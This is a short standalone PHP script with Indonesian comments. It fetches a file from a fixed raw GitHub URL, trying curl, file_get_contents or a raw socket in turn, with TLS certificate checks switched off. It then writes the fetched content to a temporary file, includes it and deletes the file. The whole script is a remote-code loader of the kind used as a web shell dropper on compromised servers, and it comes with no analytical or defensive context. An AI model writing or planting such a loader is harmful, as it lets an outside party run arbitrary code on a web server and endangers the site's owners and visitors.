<?php

/**

 * Ambil konten remote URL dengan beberapa metode:

 */

function ambil_konten($url, $timeout = 10) {

    $parts = parse_url($url);

    if ($parts === false || !isset($parts['scheme']) || !isset($parts['host'])) {

        return false;

    }

    $scheme = strtolower($parts['scheme']);

    if (!in_array($scheme, ['http', 'https'])) {

        return false;

    }

    // 1) curl

    if (function_exists('curl_init')) {

        $ch = curl_init();

        curl_setopt($ch, CURLOPT_URL, $url);

        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);

        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);

        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $timeout);

        curl_setopt($ch, CURLOPT_TIMEOUT, $timeout);

        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);

        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);

        $res = curl_exec($ch);

        $httpcode = curl_getinfo($ch, CURLINFO_HTTP_CODE);

        curl_close($ch);

        if ($res !== false && ($httpcode >= 200 && $httpcode < 400)) {

            return $res;

        }

    }

    // 2) fopen

    if (ini_get('allow_url_fopen')) {

        $ctx = stream_context_create([

            'http' => [

                'method' => 'GET',

                'timeout' => $timeout,

                'follow_location' => 1,

                'header' => "User-Agent: PHP-fetch/1.0\r\n"

            ],

            'ssl' => [

                'verify_peer' => false,

                'verify_peer_name' => false,

            ]

        ]);

        $data = @file_get_contents($url, false, $ctx);

        if ($data !== false && strlen($data) > 0) {

            return $data;

        }

    }

    // 3) fsockopen

    $host = $parts['host'];

    $port = isset($parts['port']) ? $parts['port'] : ($scheme === 'https' ? 443 : 80);

    $path = (isset($parts['path']) ? $parts['path'] : '/') . (isset($parts['query']) ? '?' . $parts['query'] : '');

    $transport = ($scheme === 'https') ? 'ssl://' : '';

    $fp = @fsockopen($transport . $host, $port, $errno, $errstr, $timeout);

    if (!$fp) return false;

    stream_set_timeout($fp, $timeout);

    $req  = "GET $path HTTP/1.1\r\n";

    $req .= "Host: $host\r\n";

    $req .= "Connection: Close\r\n\r\n";

    fwrite($fp, $req);

    $response = '';

    while (!feof($fp)) {

        $response .= fgets($fp, 4096);

    }

    fclose($fp);

    $partsResp = preg_split("/\r\n\r\n/", $response, 2);

    return $partsResp[1] ?? false;

}

// eksekusi

$url = "https://raw.githubusercontent.com/soy777/gg/main/rzss.html";

$konten = ambil_konten($url);

if ($konten === false) {

    die("Gagal mengambil data dari URL.");

}

try {

    ob_start();

    $tmp = tempnam(sys_get_temp_dir(), "kode_");

    file_put_contents($tmp, $konten);

    include $tmp;

    unlink($tmp);

    ob_end_flush();

} catch (Throwable $e) {

    ob_end_clean();

    die("Terjadi kesalahan: " . $e->getMessage());

}

?>
